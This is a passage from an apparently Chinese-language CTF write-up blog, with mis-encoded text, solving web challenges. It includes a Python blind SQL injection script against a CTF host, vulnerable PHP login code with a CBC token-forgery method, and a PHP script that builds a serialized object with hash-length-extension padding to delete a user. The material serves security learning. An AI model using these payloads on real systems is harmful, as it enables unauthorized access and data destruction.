class="line"><span class="keyword">return</span> ss[<span class="number">-1</span>::<span class="number">-1</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">GetPassword</span><span class="params">()</span>:</span></span><br><span class="line">url = <span class="string">'http://ctf.whaledu.com:10801/47g256f48gff/index.php'</span></span><br><span class="line">payload = <span class="string">"whaleadmin' union distinct select 1,2,0x&#123;hex&#125; order by 3#"</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line">testStr = makeStr(<span class="number">42</span>,<span class="number">127</span>)</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> testStr:</span><br><span class="line">data = &#123;<span class="string">'username'</span>:payload.format(hex=(flag+i).encode(<span class="string">'hex'</span>)),<span class="string">'password'</span>:<span class="string">'1'</span>&#125;</span><br><span class="line">res = requests.post(url=url,data = data)</span><br><span class="line"><span class="comment">#print res.content</span></span><br><span class="line"><span class="keyword">if</span> <span class="string">'whaleadmin'</span> <span class="keyword">not</span> <span class="keyword">in</span> res.content:</span><br><span class="line">flag = flag + chr(ord(i))</span><br><span class="line"><span class="keyword">print</span> flag</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[+]Attacked by 0verWatch"</span>,i</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line"><span class="comment">#print makeStr(42,127)</span></span><br><span class="line">GetPassword()</span><br></pre></td></tr></table></figure><p>å¾—åˆ°ä¸€ä¸ªMD5å€¼è§£å¯†ä¹‹åå¾—åˆ°flag</p><h3 id="ç¥ç§˜çš„ä»¤ç‰Œ"><a href="#ç¥ç§˜çš„ä»¤ç‰Œ" class="headerlink" title="ç¥ç§˜çš„ä»¤ç‰Œ"></a>ç¥ç§˜çš„ä»¤ç‰Œ</h3><p>è¿™ä¸ªé¢˜ç›®æ‰«ä¸€ä¸‹ç›®å½•å¯ä»¥å‘ç°index.php~ï¼Œç„¶åé‡Œé¢æœ‰æºç </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &apos;config.php&apos;;</span><br><span class="line">error_reporting(0);</span><br><span class="line">define(&quot;SECRET_KEY&quot;, &quot;this_is_key_you_do_not_know&quot;);</span><br><span class="line">define(&quot;METHOD&quot;, &quot;aes-128-cbc&quot;);</span><br><span class="line"></span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line">function get_random_token()&#123;</span><br><span class="line">    $random_token=&apos;&apos;;</span><br><span class="line">    for($i=0;$i&lt;16;$i++)&#123;</span><br><span class="line">        $random_token.=chr(rand(1,255));</span><br><span class="line">    &#125;</span><br><span class="line">    return $random_token;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function get_identity()</span><br><span class="line">&#123;</span><br><span class="line">    global $defaultId;</span><br><span class="line">    $j = $defaultId;</span><br><span class="line">    $token = get_random_token();</span><br><span class="line">    $c = openssl_encrypt($j, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $token);</span><br><span class="line">    $_SESSION[&apos;id&apos;] = base64_encode($c);</span><br><span class="line">    setcookie(&quot;ID&quot;, base64_encode($c));</span><br><span class="line">    setcookie(&quot;token&quot;, base64_encode($token));</span><br><span class="line">    if ($j === &apos;admin&apos;) &#123;</span><br><span class="line">        $_SESSION[&apos;isadmin&apos;] = true;</span><br><span class="line">    &#125; else $_SESSION[&apos;isadmin&apos;] = false;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function test_identity()</span><br><span class="line">&#123;</span><br><span class="line">    if (!isset($_COOKIE[&quot;token&quot;]))</span><br><span class="line">        return array();</span><br><span class="line">    if (isset($_SESSION[&apos;id&apos;])) &#123;</span><br><span class="line">        $c = base64_decode($_SESSION[&apos;id&apos;]);</span><br><span class="line">        if ($u = openssl_decrypt($c, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, base64_decode($_COOKIE[&quot;token&quot;]))) &#123;</span><br><span class="line">            if ($u === &apos;admin&apos;) &#123;</span><br><span class="line">                $_SESSION[&apos;isadmin&apos;] = true;</span><br><span class="line">            &#125; else $_SESSION[&apos;isadmin&apos;] = false;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            die(&quot;ERROR!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function login($encrypted_pass, $pass)</span><br><span class="line">&#123;</span><br><span class="line">    $encrypted_pass = base64_decode($encrypted_pass);</span><br><span class="line">    $iv = substr($encrypted_pass, 0, 16);</span><br><span class="line">    $cipher = substr($encrypted_pass, 16);</span><br><span class="line">    $password = openssl_decrypt($cipher, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv);</span><br><span class="line">    return $password == $pass;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">function need_login($message = NULL) &#123;</span><br><span class="line">    echo &quot;   &lt;!doctype html&gt;</span><br><span class="line">        &lt;html&gt;</span><br><span class="line">        &lt;head&gt;</span><br><span class="line">        &lt;meta charset=\&quot;UTF-8\&quot;&gt;</span><br><span class="line">        &lt;title&gt;Login&lt;/title&gt;</span><br><span class="line">        &lt;link rel=\&quot;stylesheet\&quot; href=\&quot;CSS/target.css\&quot;&gt;</span><br><span class="line">            &lt;script src=\&quot;https://cdnjs.cloudflare.com/ajax/libs/prefixfree/1.0.7/prefixfree.min.js\&quot;&gt;&lt;/script&gt;</span><br><span class="line">        &lt;/head&gt;</span><br><span class="line">        &lt;body&gt;&quot;;</span><br><span class="line">    if (isset($message)) &#123;</span><br><span class="line">        echo &quot;  &lt;div&gt;&quot; . $message . &quot;&lt;/div&gt;\n&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    echo &quot;&lt;form method=\&quot;POST\&quot; action=&apos;&apos;&gt;</span><br><span class="line">            &lt;div class=\&quot;body\&quot;&gt;&lt;/div&gt;</span><br><span class="line">                &lt;div class=\&quot;grad\&quot;&gt;&lt;/div&gt;</span><br><span class="line">                    &lt;div class=\&quot;header\&quot;&gt;</span><br><span class="line">                        &lt;div&gt;Log&lt;span&gt;In&lt;/span&gt;&lt;/div&gt;</span><br><span class="line">                    &lt;/div&gt;</span><br><span class="line">                    &lt;br&gt;</span><br><span class="line">                    &lt;div class=\&quot;login\&quot;&gt;</span><br><span class="line">                        &lt;input type=\&quot;text\&quot; placeholder=\&quot;username\&quot; name=\&quot;username\&quot;&gt;</span><br><span class="line">                        &lt;input type=\&quot;password\&quot; placeholder=\&quot;password\&quot; name=\&quot;password\&quot;&gt;               </span><br><span class="line">                        &lt;input type=\&quot;submit\&quot; value=\&quot;Login\&quot;&gt;</span><br><span class="line">                    &lt;/div&gt;</span><br><span class="line">                     &lt;script src=&apos;http://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js&apos;&gt;&lt;/script&gt;</span><br><span class="line">            &lt;/form&gt;</span><br><span class="line">        &lt;/body&gt;</span><br><span class="line">    &lt;/html&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function show_homepage() &#123;</span><br><span class="line">    echo &quot;&lt;!doctype html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;&lt;title&gt;Login&lt;/title&gt;&lt;/head&gt;</span><br><span class="line">&lt;body&gt;&quot;;</span><br><span class="line">    global $flag;</span><br><span class="line">    printf(&quot;Hello ~~~ ctfer! &quot;);</span><br><span class="line">    if ($_SESSION[&quot;isadmin&quot;])</span><br><span class="line">        echo $flag;</span><br><span class="line">    echo &quot;&lt;div&gt;&lt;a href=\&quot;logout.php\&quot;&gt;Log out&lt;/a&gt;&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;&quot;;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (isset($_POST[&apos;username&apos;]) &amp;&amp; isset($_POST[&apos;password&apos;])) &#123;</span><br><span class="line">    $username = (string)$_POST[&apos;username&apos;];</span><br><span class="line">    $password = (string)$_POST[&apos;password&apos;];</span><br><span class="line">    $query = &quot;SELECT username, encrypted_pass from users WHERE username=&apos;$username&apos;&quot;;</span><br><span class="line">    $res = $conn-&gt;query($query) or trigger_error($conn-&gt;error . &quot;[$query]&quot;);</span><br><span class="line">    if ($row = $res-&gt;fetch_assoc()) &#123;</span><br><span class="line">        $uname = $row[&apos;username&apos;];</span><br><span class="line">        $encrypted_pass = $row[&quot;encrypted_pass&quot;];</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    if ($row &amp;&amp; login($encrypted_pass, $password)) &#123;</span><br><span class="line">        echo &quot;you are in!&quot; . &quot;&lt;/br&gt;&quot;;</span><br><span class="line">        get_identity();</span><br><span class="line">        show_homepage();</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo &quot;&lt;script&gt;alert(&apos;login failed!&apos;);&lt;/script&gt;&quot;;</span><br><span class="line">        need_login(&quot;Login Failed!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125; else &#123;</span><br><span class="line">    test_identity();</span><br><span class="line">    if (isset($_SESSION[&quot;id&quot;])) &#123;</span><br><span class="line">        show_homepage();</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        need_login();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…¨å±€æœç´¢ä¹‹åå‘ç°å‡ºç°flagçš„åœ°æ–¹ï¼Œç„¶åå¼€å§‹åæ¨ï¼Œä»ä»£ç é‡Œé¢å¯ä»¥æ¨å‡ºå‡ ç‚¹</p><ol><li>è¦æƒ³å‡ºç°flagï¼Œå¿…é¡»å¾—æ»¡è¶³test_identity()ç„¶åç»§ç»­æ¨æœ‰ï¼Œ<code>u == admin--&gt;$_SESSION[&#39;isadmin&#39;] = true--&gt;get_identity()--&gt;get_random_token()--&gt; if ($j === &#39;admin&#39;) { $_SESSION[&#39;isadmin&#39;] = true;} --&gt; login()</code>ï¼Œæœ€åå‘ç°password == $pass</li><li>å¯¹å¯†æ–‡cè¦è¿›è¡Œä¸€æ¬¡openssl_decryptï¼Œç”¨çš„methodæ˜¯CBCï¼Œæ‰èƒ½å‡ºæ¥ç»“æœï¼Œè¿™é‡Œå°±è¦è¿ç”¨åˆ°ä¸€ä¸ªå«padding oracleçš„æ”»å‡»æ–¹æ³•ï¼Œè¿™é‡Œçš„IVå€¼æ˜¯<code>base64_decode($_COOKIE[&quot;token&quot;])</code>ï¼Œè€Œcæ˜¯<code>$_SESSION[&#39;id&#39;]</code></li><li>ç™»å½•çš„æ—¶å€™passwordéœ€è¦ä¸€ä¸ªç»•è¿‡ï¼Œå› ä¸ºå­˜åœ¨<code>==</code>çš„ç¬¦å·ï¼Œä¸éš¾è®©äººæƒ³åˆ°å¯ä»¥ç»•è¿‡</li></ol><p>padding oracleçš„æ”»å‡»æ–¹æ³•æ˜¯é’ˆå¯¹CBCé“¾æ¥æ¨¡å¼çš„çš„æ”»å‡»ï¼Œè·Ÿä½¿ç”¨çš„åŠ è§£å¯†ç®—æ³•æ— å…³ï¼ŒCBCæ¨¡å¼åœ¨æœåŠ¡å™¨ç«¯å¦‚ä½•åšå¤„ç†å‘¢ï¼Ÿå…ˆæ£€æŸ¥å¯†ç æ˜¯å¦å¯ä»¥è§£å¯†ï¼Œå¦‚æœå¯ä»¥å°±ä¼šè¿”å›è§£å¯†ç»“æœå’Œä¸€ä¸ªæ­£ç¡®çš„æ ‡è®°å€¼ï¼Œå¦åˆ™å°±ç›´æ¥ä¸€ä¸ªé”™è¯¯çš„æ ‡å¿—ã€‚è¿™å°±å¯ä»¥åˆ©ç”¨æŠ¥é”™çš„ç‰¹ç‚¹å»æŒ–æ˜æ­¤å¤„çš„æ¼æ´ï¼Œæœ‰ç‚¹åƒç›²æ³¨ï¼Œæˆ‘ä¹ˆå¯æ§çš„è¾“å…¥æ˜¯éœ€è¦è§£å¯†çš„å¯†æ–‡è¿˜æœ‰IVå€¼ã€‚</p><p>è¿™ä¸ªé¢˜ç›®é‡ç‚¹åœ¨äºæ„é€ defaultIDç­‰äºadminåŠ å¯†åçš„ä¸œè¥¿ï¼Œå¦‚ä½•å®ç°ï¼Ÿtokenå¯ä»¥ä¼ªé€ åŸå› æ˜¯å¯ä»¥ç»•è¿‡ç™»å½•ä¸éœ€è¦é‡æ–°å»ºç«‹ä¸€ä¸ªIDï¼Œæ‰€ä»¥é‡ç‚¹ä¹Ÿåœ¨ä¼ªé€ tokenä¸Šï¼Œå› ä¸ºdefaultID = ä¸­é—´å€¼^tokenï¼Œ æ„é€ tokenâ€™ = token^defaultID^â€™admin\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0bâ€™ï¼Œç„¶åæœ€ç»ˆç›¸å½“äºä¸­é—´å€¼^token^defaultID^â€™admin\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0bâ€™ = defaultID^defaultID^â€™admin\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0bâ€™ =   â€˜admin\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0bâ€™ï¼Œæœ€åå®Œæˆæ„é€ ã€‚</p><p><img src="https://s2.ax1x.com/2019/02/03/kG1ZE4.png" alt="kG1ZE4.png"></p><h3 id="è“é²¸ç›¸å†Œç³»ç»Ÿ"><a href="#è“é²¸ç›¸å†Œç³»ç»Ÿ" class="headerlink" title="è“é²¸ç›¸å†Œç³»ç»Ÿ"></a>è“é²¸ç›¸å†Œç³»ç»Ÿ</h3><p>è¿™ä¸ªé¢˜ç›®è€ƒå¯Ÿçš„ç‚¹æ¯”è¾ƒå¤šï¼Œä½†æœ‰ç‚¹æ„æ€ï¼Œå…ˆè€ƒå¯Ÿäº†ä»£ç å®¡è®¡ï¼Œç„¶åå°±æ˜¯hashé•¿åº¦æ‹“å±•æ”»å‡»ï¼Œç„¶åå°±æ˜¯ä¸€ä¸ªååºåˆ—åŒ–ä»¥åŠSQLæ³¨å…¥</p><p>é¦–å…ˆåœ¨common.phpä¸­å‘ç°ä»»æ„çš„å˜é‡è¦†ç›–ï¼Œè¿™é‡Œå°±æ˜¯ä¸ºä»€ä¹ˆåé¢å¯ä»¥éšä¾¿ä¼ å‚çš„åŸå› </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span>(<span class="keyword">Array</span>(<span class="string">"_POST"</span>,<span class="string">"_GET"</span>,<span class="string">"_COOKIE"</span>) <span class="keyword">as</span> $key)&#123;</span><br><span class="line"><span class="keyword">foreach</span>($$key <span class="keyword">as</span> $k =&gt; $v)&#123;</span><br><span class="line"><span class="keyword">if</span>(is_array($v))&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">"hello,hacker!"</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">$k[<span class="number">0</span>] !=<span class="string">'_'</span>?$$k = addslashes($v):$$k = <span class="string">""</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥å‘ç°è¿™é‡Œé¢æœ‰å¥½å‡ æ¡SQLè¯­å¥ä¸å­˜åœ¨å•å¼•å·ï¼Œå› æ­¤ä¸ç®¡å­˜ä¸å­˜åœ¨addlasheséƒ½ä¼šå¯¹æ­¤è¯­å¥æ²¡æœ‰ä»»ä½•ä¿æŠ¤ï¼Œæ‰€ä»¥è¿™é‡Œæ˜¯ç¬¬äºŒä¸ªåˆ©ç”¨ç‚¹ã€‚é‡Œé¢çš„$idæ˜¯ä¸€ä¸ªå¯æ§ç‚¹ï¼Œä½†å‰æå¾—åœ¨æ•°æ®åº“é‡Œé¢æ‰¾ä¸åˆ°useridçš„æ•°æ®æ‰è¡Œï¼Œæ‰å¯ä»¥ç»™å®ƒèµ‹å€¼ï¼Œä½†ç½‘é¡µå­˜åœ¨åŠŸèƒ½å¯ä»¥æŠŠä»–ç»™åˆ é™¤æ‰ï¼Œï¼Œä½†æ˜¯è¿™äº›åŠŸèƒ½è¿˜æ˜¯å¾—å…ˆç™»å½•æ‰è¡Œï¼Œæ»¡è¶³session[login] == 1çš„æ¡ä»¶ã€‚</p><p><img src="https://s2.ax1x.com/2019/02/03/kG8Vh9.png" alt="kG8Vh9.png"></p><p>æ¥ç€åœ¨api.phpåŒæ ·å‘ç°ä¸€ä¸ªæ²¡æœ‰é™„åˆå§‹å€¼çš„å˜é‡$apiï¼Œè¿™ä¸ªå˜é‡å‰é¢è¿˜æœ‰unserializeè¿™å¾ˆæ˜æ˜¾å°±æ˜¯ä¸€ä¸ªååºåˆ—åŒ–çš„æ¼æ´ï¼Œä½†è¿™ä¸ªæ—¶å€™æˆ‘ä»¬æƒ³è¦è°ƒç”¨é‡Œé¢çš„do_methodè¿˜å¿…é¡»æ»¡è¶³checkå‡½æ•°é‡Œé¢çš„<code>$this-&gt;check === md5($result[&#39;salt&#39;] . $this-&gt;data . $username)</code>è¿™ä¸ªæ¡ä»¶ï¼Œè¿™ä¸ªä¹Ÿå¾ˆç†Ÿæ‚‰äº†ï¼Œhashé•¿åº¦æ‹“å±•æ”»å‡»çš„ç»“æ„ï¼Œæˆ‘ä»¬å¯ä»¥æ„é€ ä¸€ä¸‹æˆä¸ºadmin</p><p>æ­¤æ—¶æˆ‘ä»¬éœ€è¦çš„æ˜¯saltçš„MD5ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨forgot.phpé‡Œé¢æ‰¾åˆ°å…¶hashå€¼ï¼Œè®©ä»–è¿”å›url</p><p><img src="https://s2.ax1x.com/2019/02/03/kGGkKP.png" alt="kGGkKP.png"></p><p><img src="https://s2.ax1x.com/2019/02/03/kGGZVS.png" alt="kGGZVS.png"></p><p>å¼€å§‹æ„é€ æ‹“å±•admin</p><p><img src="https://s2.ax1x.com/2019/02/03/kGGM2n.png" alt="kGGM2n.png"></p><p>ç„¶åå¼€å§‹æ„é€ ååºåˆ—åŒ–,ä½†æ˜¯æˆ‘ä»¬è¿˜éœ€è¦useridï¼Œåœ¨å“ªé‡Œå¯ä»¥å¾—åˆ°è‡ªå·±çš„idå€¼å‘¢ï¼Ÿå¯ä»¥åœ¨index.phpé‡Œé¢å¯ä»¥å‘ç°ï¼Œç™»é™†æˆåŠŸä»¥åæˆ‘ä»¬å¯ä»¥åœ¨cookieé‡Œé¢å‘ç°è‡ªå·±çš„id</p><p><img src="https://s2.ax1x.com/2019/02/03/kGGLGj.png" alt="kGGLGj.png"></p><p>ç„¶åå¼€å§‹æ„é€ ååºåˆ—åŒ–</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">admin</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $name = <span class="string">"admin"</span>;</span><br><span class="line">    <span class="keyword">var</span> $check= <span class="string">"4af6ae895d65fe450ff1e9531e0579d2"</span>;</span><br><span class="line">    <span class="keyword">var</span> $data = <span class="string">"\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x80\x00\x00\x00\x00\x00\x00\x00"</span>;</span><br><span class="line">    <span class="keyword">var</span> $method=<span class="string">"del_user"</span>;   <span class="comment">//è¦è°ƒç”¨çš„å‡½æ•°</span></span><br><span class="line">    <span class="keyword">var</span> $userid=<span class="string">"70"</span>;  <span class="comment">//è¦åˆ é™¤çš„ç”¨æˆ·</span></span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> admin();</span><br><span class="line">$api = base64_encode(serialize($a));</span><br><span class="line"><span class="keyword">echo</span> $api;</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯æƒ³è¦è·³è½¬åˆ°api.phpè¿™ä¸ªé¡µé¢çš„æ—¶å€™å°±ä¼šå‘ç°è¿˜æ˜¯ä¼šè·³è½¬åˆ°riji.phpï¼ŒæŸ¥çœ‹æºç å¯ä»¥å¾—çŸ¥è¿™é‡Œé¢å­˜åœ¨å¯¹äºsession[login]çš„æ£€æµ‹åªè¦å¦èµ·ä¸€ä¸ªæµè§ˆå™¨å†è®¿é—®api.phpå°±å¯ä»¥ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (@$_SESSION[<span class="string">'login'</span>] === <span class="number">1</span>)&#123;</span><br><span class="line">    header(<span class="string">'Location:/web/riji.php'</span>);</span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æŠŠæˆ‘åŸæ¥çš„idç»™åˆ é™¤è¿™æ ·å°±å¯ä»¥å¯¹æˆ‘çš„idå‚æ•°éšå¿ƒæ‰€æ¬²äº†</p><p><img src="https://s2.ax1x.com/2019/02/03/kGJLTO.png" alt="kGJLTO.png"></p><p>è¿”å›åˆ°åŸæ¥çš„é¡µé¢ç›´æ¥æ³¨å…¥è·å¾—flag</p><p><img src="https://s2.ax1x.com/2019/02/03/kGYVhQ.png" alt="kGYVhQ.png"></p><h3 id="è“é²¸æ–‡ä»¶ç®¡ç†ç³»ç»Ÿ"><a href="#è“é²¸æ–‡ä»¶ç®¡ç†ç³»ç»Ÿ" class="headerlink" title="è“é²¸æ–‡ä»¶ç®¡ç†ç³»ç»Ÿ"></a>è“é²¸æ–‡ä»¶ç®¡ç†ç³»ç»Ÿ</h3><p>è¿™æ˜¯ä¸€é“ä»£ç å®¡è®¡çš„é¢˜ç›®ï¼Œè¿™åº”è¯¥æ˜¯æˆ‘ç¬¬ä¸€æ¬¡çœ‹è¿™ç§æ•´ç«™çš„ä»£ç ï¼Œè¯´å®è¯ä¸€å¼€å§‹åªçœ‹åˆ°ä¸Šä¼ é¡µé¢çš„æ—¶å€™è„‘å­ä¸€ç›´åœ¨æƒ³åº”è¯¥æ˜¯ä¸Šä¼ æ¼æ´ï¼Œå¯èƒ½æ˜¯å„ç§æˆªæ–­ä¹‹ç±»çš„ç„¶ågetshellï¼Œä½†åæ¥çœ‹äº†ä¸‹æºä»£ç å‘ç°ä¸è¡Œï¼Œæ‰€ä»¥ä¹Ÿåªèƒ½ä¸€æ­¥æ­¥æ¥äº†</p><p>å¯¹äºæˆ‘è¿™ç§å°ç™½ï¼Œç¬¬ä¸€æ¬¡åšè¿™æ ·çš„ä»£ç å®¡è®¡åªèƒ½å…ˆä»æ•´ä½“ç»“æ„åˆ†æå¼€å§‹ï¼Œä¹Ÿå°±æ˜¯å…ˆå¯¹ç½‘ç«™ç»“æ„è¿›è¡Œå®¡è®¡ï¼ŒæŒ‰ç…§ç½‘ç«™é€»è¾‘å»çœ‹ä»£ç ï¼Œæœ‰å…¨å±€é…ç½®æ–‡ä»¶å¦‚(config.php, common.inc.phpä¹‹ç±»çš„)å°±å…ˆçœ‹ä¸€ä¸‹ã€‚</p><p><img src="https://s2.ax1x.com/2019/02/03/kGY3AU.png" alt="kGY3AU.png"></p><p>ä»ç½‘ç«™ç»“æ„çœ‹ä¸Šä¼ ï¼Œæ”¹åï¼Œåˆ é™¤æ˜¯ç½‘ç«™çš„ä¸»è¦åŠŸèƒ½ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¸»è¦çœ‹è¿™ä¸‰å—åŠŸèƒ½ï¼Œä½†æ˜¯æˆ‘ä»¬å‘ç°æœ‰å…¨å±€é…ç½®æ–‡ä»¶common.inc.phpï¼Œé‚£æˆ‘ä»¬å°±å…ˆæŸ¥çœ‹å®ƒ</p><p><img src="https://s2.ax1x.com/2019/02/03/kGYIUS.png" alt="kGYIUS.png"></p><p>å¯ä»¥çœ‹åˆ°è¿™ä¸ªå…¨å±€é…ç½®æ–‡ä»¶é‡Œé¢å¯¹å…¨å±€å˜é‡è¿›è¡Œäº†è½¬ä¹‰ï¼Œç›¸å½“äºPDOé‡Œé¢çš„magic_qutoeï¼Œä¸€èˆ¬æ¥è®²åœ¨å…¨å±€è®¾ç½®äº†è½¬ä¹‰å°±å¾ˆéš¾å­˜åœ¨æ³¨å…¥çš„æ¼æ´,è€Œä¸”ä¸å­˜åœ¨å…¶ä»–æ•°å­—å‹çš„æ³¨å…¥</p><p>å†æ¥çœ‹upload.php</p><p>ç¬¬ä¸€æ®µä»£ç æˆ‘ä»¬å¯ä»¥çœ‹å¾—åˆ°ä»£ç æ–‡ä»¶åç¼€åè¿›è¡Œäº†è¿‡æ»¤ï¼Œè€Œä¸”æ˜¯ç™½åå•è¿‡æ»¤ï¼Œè¿™æ ·å°±åˆå°‘äº†åˆ©ç”¨çš„å¯èƒ½äº†ï¼Œè€Œä¸”è¿™é‡Œæ˜¯æŠŠæ–‡ä»¶åè·Ÿåç¼€ååˆ†å¼€å­˜å‚¨çš„</p><p><img src="https://s2.ax1x.com/2019/02/03/kGYo4g.png" alt="kGYo4g.png"></p><p>è¿™é‡Œçš„filenameæ˜¯ä¸å¸¦åç¼€åçš„ï¼Œextensionæ˜¯åç¼€å</p><p><img src="https://s2.ax1x.com/2019/02/03/kGYH3j.png" alt="kGYH3j.png"></p><p>è¿™éƒ¨åˆ†æ˜¯åœ¨æ•°æ®åº“ä¸­æ’å…¥ä¸€æ¡æ–°æ–‡ä»¶è®°å½•ï¼Œè¯•ç€ä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶ï¼Œä»–åœ¨æ•°æ®åº“çš„å­˜å‚¨æƒ…å†µæ˜¯è¿™æ ·çš„</p><p><img src="https://s2.ax1x.com/2019/02/03/kGYbgs.png" 